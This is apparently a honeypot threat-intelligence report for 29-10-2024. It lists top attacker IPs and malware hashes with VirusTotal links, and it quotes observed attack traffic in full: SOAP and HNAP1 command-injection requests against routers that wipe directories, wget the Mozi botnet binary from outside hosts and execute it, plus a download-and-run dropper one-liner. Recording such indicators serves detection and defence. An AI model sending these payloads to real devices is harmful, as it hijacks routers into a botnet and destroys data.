@@ -1,0 +1,97 @@
+Top 5 IPs for 29-10-2024 :
+
+117.241.100.16
+175.147.55.77
+222.137.99.111
+166.247.198.82
+121.54.188.143
+
+
+
+Malware Observed:
+
+File name : sshd
+10488af6e5a0482515e34dbdc8e03e33e1757d16e1489ce0a191a8ecb90a7255
+https://www.virustotal.com/gui/file/10488af6e5a0482515e34dbdc8e03e33e1757d16e1489ce0a191a8ecb90a7255
+
+File name : sshd
+41da7415697d2806ef90e1a1bc6f084ce0cda4ae519508d7b0a8c9c48a855a8e
+https://www.virustotal.com/gui/file/41da7415697d2806ef90e1a1bc6f084ce0cda4ae519508d7b0a8c9c48a855a8e
+
+File name : sshd
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+https://www.virustotal.com/gui/file/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+
+File name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+File name : redtail.arm7
+d4635f0f5ab84af5e5194453dbf60eaebf6ec47d3675cb5044e5746fb48bd4b4
+https://www.virustotal.com/gui/file/d4635f0f5ab84af5e5194453dbf60eaebf6ec47d3675cb5044e5746fb48bd4b4
+
+File name : redtail.arm8
+992cb5a753697ee2642aa390f09326fcdb7fd59119053d6b1bdd35d47e62f472
+https://www.virustotal.com/gui/file/992cb5a753697ee2642aa390f09326fcdb7fd59119053d6b1bdd35d47e62f472
+
+File name : redtail.i686
+69dc9dd8065692ea262850b617c621e6c1361e9095a90b653b26e3901597f586
+https://www.virustotal.com/gui/file/69dc9dd8065692ea262850b617c621e6c1361e9095a90b653b26e3901597f586
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+
+71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+
+26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+https://www.virustotal.com/gui/file/26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+
+
+Commands/exploits observed :
+
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+Host: <HOST>
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Hello, World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://124.6.101.211:41870/Mozi.m;/tmp/Mozi.m dlink`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
+
+
+
+
+POST /picsdesc.xml HTTP/1.1
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: /
+User-Agent: Hello-World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope//" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>cd /var/; wget http://192.168.1.1:8088/Mozi.m; chmod +x Mozi.m; ./Mozi.m</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
+
+
+
+cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\\x63\\x6F\\x6E\\x6E\\x65\\x63\\x74\\x65\\x64'
+
+POST /HNAP1/ HTTP/1.0
+Host: <HOST>
+Content-Type: text/xml; charset="utf-8"
+SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://117.209.86.181:47076/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
+Content-Length: 640
+
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><AddPortMapping xmlns="http://purenetworks.com/HNAP1/"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>
+
